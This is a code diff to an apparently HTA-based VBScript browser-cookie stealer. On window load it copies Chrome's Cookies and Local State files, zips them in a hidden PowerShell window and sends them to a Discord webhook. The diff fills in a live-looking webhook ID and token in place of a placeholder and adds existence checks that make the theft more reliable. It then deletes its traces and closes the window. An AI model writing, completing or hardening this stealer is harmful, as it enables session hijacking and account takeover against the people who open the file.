@@ -15,12 +15,13 @@ Sub Window_OnLoad
     localState = userProfile & "\AppData\Local\Google\Chrome\User Data\Local State"
     tempZip = shell.ExpandEnvironmentStrings("%TEMP%") & "\upd.zip"
     
-    ' PUT YOUR DISCORD WEBHOOK HERE
-    webhook = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
+    webhook = "https://discord.com/api/webhooks/1557537274613469307/QDbmzYDUHRCzK_7OQMXsibxACoABgfSkBkBxIqh4NXh6OPYPZEBDm7NznEl8mLTxPRwE"
     
     If fso.FileExists(cookies) Then
         fso.CopyFile cookies, shell.ExpandEnvironmentStrings("%TEMP%") & "\ck.tmp", True
-        fso.CopyFile localState, shell.ExpandEnvironmentStrings("%TEMP%") & "\ls.tmp", True
+        If fso.FileExists(localState) Then
+            fso.CopyFile localState, shell.ExpandEnvironmentStrings("%TEMP%") & "\ls.tmp", True
+        End If
         
         shell.Run "powershell -WindowStyle Hidden -Command Compress-Archive -Path '" & shell.ExpandEnvironmentStrings("%TEMP%") & "\ck.tmp','" & shell.ExpandEnvironmentStrings("%TEMP%") & "\ls.tmp' -DestinationPath '" & tempZip & "' -Force", 0, True
         
@@ -48,7 +49,9 @@ Sub Window_OnLoad
         ado.Close
         
         fso.DeleteFile shell.ExpandEnvironmentStrings("%TEMP%") & "\ck.tmp"
-        fso.DeleteFile shell.ExpandEnvironmentStrings("%TEMP%") & "\ls.tmp"
+        If fso.FileExists(shell.ExpandEnvironmentStrings("%TEMP%") & "\ls.tmp") Then
+            fso.DeleteFile shell.ExpandEnvironmentStrings("%TEMP%") & "\ls.tmp"
+        End If
         fso.DeleteFile tempZip
     End If
     window.close
